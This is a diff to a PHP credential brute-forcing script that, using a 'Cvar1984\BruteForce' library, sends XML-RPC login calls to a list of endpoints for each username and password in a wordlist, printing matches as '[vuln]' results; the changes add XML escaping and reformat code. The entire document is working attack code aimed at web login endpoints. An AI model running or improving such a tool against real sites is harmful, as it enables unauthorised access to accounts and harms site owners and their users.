@@ -4,8 +4,8 @@ use Cvar1984\BruteForce;
 
 require __DIR__ . '/vendor/autoload.php';
 
-$fields = 
-'<?xml version="1.0" encoding="utf-8"?> 
+$fields =
+    '<?xml version="1.0" encoding="utf-8"?> 
 <methodCall>
     <methodName>system.listMethods</methodName>
     <params></params>
@@ -19,9 +19,11 @@ $passwordListCount = count($passwordLists);
 
 foreach ($endpoints as $endpoint) {
     foreach ($usernames as $username) {
+        $username = htmlspecialchars($username, ENT_XML1, 'UTF-8'); // format xml
         $brute->requestXml($endpoint, $fields);
         $result = $brute->getRequestResult();
-        if(!$result) {
+        
+        if (!$result) {
             continue; // target seems to be not vulnerable
         }
 
@@ -30,7 +32,9 @@ foreach ($endpoints as $endpoint) {
         }
 
         for ($x = 0; $x < $passwordListCount; $x++) {
-            echo '[testing] url: ', $endpoint, ' username: ', $username, ' password: ' . $passwordLists[$x], "\n";
+            $password = htmlspecialchars($passwordLists[$x], ENT_XML1, 'UTF-8'); // format xml
+            echo '[testing] url: ', $endpoint, ' username: ', $username, ' password: ' . $password, "\n";
+            
             $fields = sprintf(
                 '<?xml version="1.0" encoding="UTF-8"?>
                 <methodCall>
@@ -39,11 +43,15 @@ foreach ($endpoints as $endpoint) {
                             <param><value>%s</value></param>
                             <param><value>%s</value></param>
                         </params>
-                </methodCall>', $username, $passwordLists[$x]);
+                </methodCall>',
+                $username,
+                $password
+            );
             $brute->requestXml($endpoint, $fields);
             $result = $brute->getRequestResult();
+            
             if (!$brute->searchArray('403', $result)) {
-                echo '[vuln] url: ', $endpoint, ' username: ', $username, ' password: ', $passwordLists[$x], "\n";
+                echo '[vuln] url: ', $endpoint, ' username: ', $username, ' password: ', $password, "\n";
             }
         }
     }
